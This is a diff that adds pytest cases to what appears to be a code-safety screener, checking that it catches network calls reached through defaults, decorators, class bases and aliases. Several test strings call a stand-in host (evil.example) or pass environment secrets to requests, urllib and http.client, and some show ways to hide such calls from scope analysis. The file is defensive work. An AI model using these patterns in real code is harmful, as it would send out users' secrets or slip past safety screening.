@@ -3985,3 +3985,171 @@ class TestTheFastPathChangesNothing:
         finally:
             tools._network_candidates_possible = slow
         assert forced == _check_code_safety(code), code
+
+
+class TestADefaultRunsBeforeItsParameterExists:
+    """Decorators, defaults and annotations are evaluated where the def is written, not inside it.
+
+    A parameter named after an imported function shadows that name for the body, and only for the
+    body. The defaults are already running by the time the parameter exists, so a call there is
+    the imported one and has to be screened as such.
+    """
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                "from requests import get as fetch\n"
+                'def f(fetch = print, x = fetch("http://evil.example/x")):\n'
+                "    pass\n",
+                id = "a_default_calls_the_import_it_is_named_after",
+            ),
+            pytest.param(
+                "from requests import get as fetch\n"
+                'f = lambda fetch = print, x = fetch("http://evil.example/x"): None\n',
+                id = "a_lambda_default_does_the_same",
+            ),
+            pytest.param(
+                "from requests import get as fetch\n"
+                'def f(fetch, x: fetch("http://evil.example/x") = 1):\n'
+                "    pass\n",
+                id = "an_annotation_is_evaluated_outside_too",
+            ),
+            pytest.param(
+                "from requests import get as fetch\n"
+                '@fetch("http://evil.example/x")\n'
+                "def fetch():\n"
+                "    pass\n",
+                id = "a_decorator_runs_before_the_name_is_rebound",
+            ),
+            pytest.param(
+                "from requests import get as fetch\n"
+                'class C(fetch("http://evil.example/x")):\n'
+                "    pass\n",
+                id = "a_class_base_is_evaluated_outside_the_class",
+            ),
+        ],
+    )
+    def test_a_call_outside_the_body_is_still_screened(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                "from requests import get as fetch\n"
+                "def f(fetch):\n"
+                '    return fetch("http://evil.example/x")\n',
+                id = "the_parameter_still_shadows_the_body",
+            ),
+            pytest.param(
+                "from requests import get as fetch\n"
+                'f = lambda fetch: fetch("http://evil.example/x")\n',
+                id = "a_lambda_parameter_shadows_its_expression",
+            ),
+        ],
+    )
+    def test_the_body_is_still_the_parameter(self, code):
+        assert _check_code_safety(code) is None, code
+
+
+class TestACopyOfAShadowedNameCarriesNothing:
+    """An assignment copies what the source names AT THAT LINE, not what it once named."""
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                "from requests import get as fetch\n"
+                "fetch = print\n"
+                "g = fetch\n"
+                "import os\n"
+                'g(os.environ["K"])\n',
+                id = "the_function_alias_is_not_inherited",
+            ),
+            pytest.param(
+                "import requests as r\n"
+                "r = object()\n"
+                "s = r\n"
+                "import os\n"
+                's.get(os.environ["K"])\n',
+                id = "the_module_alias_is_not_inherited",
+            ),
+        ],
+    )
+    def test_a_stale_source_hands_over_no_candidate(self, code):
+        assert _check_code_safety(code) is None, code
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                "from requests import get as fetch\n"
+                "g = fetch\n"
+                "import os\n"
+                'g(os.environ["K"])\n',
+                id = "a_live_function_alias_is_still_carried",
+            ),
+            pytest.param(
+                'import requests as r\ns = r\nimport os\ns.get(os.environ["K"])\n',
+                id = "a_live_module_alias_is_still_carried",
+            ),
+            pytest.param(
+                "from requests import get as fetch\n"
+                "def outer():\n"
+                "    fetch = print\n"
+                "g = fetch\n"
+                "import os\n"
+                'g(os.environ["K"])\n',
+                id = "a_rebinding_in_another_scope_does_not_count",
+            ),
+        ],
+    )
+    def test_a_live_source_still_hands_its_candidate_over(self, code):
+        assert _check_code_safety(code) is not None, code
+
+
+class TestCopyingTheParentPackageCarriesTheModule:
+    """`import urllib.request` binds `urllib`, so the parent is a way to reach the module."""
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                "import urllib.request\n"
+                "u = urllib\n"
+                "import os\n"
+                'u.request.urlopen(os.environ["K"])\n',
+                id = "urllib_reached_through_its_parent",
+            ),
+            pytest.param(
+                "import http.client\n"
+                "h = http\n"
+                "import os\n"
+                'h.client.HTTPSConnection(os.environ["K"])\n',
+                id = "http_client_reached_through_its_parent",
+            ),
+        ],
+    )
+    def test_the_parent_is_still_the_module(self, code):
+        assert _check_code_safety(code) is not None, code
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            pytest.param(
+                'import urllib.request\nu = urllib\nprint(u.parse.quote("a b"))\n',
+                id = "a_sibling_module_is_not_network",
+            ),
+            pytest.param(
+                "import urllib.request\n"
+                "urllib = object()\n"
+                "u = urllib\n"
+                "import os\n"
+                'u.request.urlopen(os.environ["K"])\n',
+                id = "a_rebound_parent_carries_nothing",
+            ),
+        ],
+    )
+    def test_the_parent_is_not_over_read(self, code):
+        assert _check_code_safety(code) is None, code
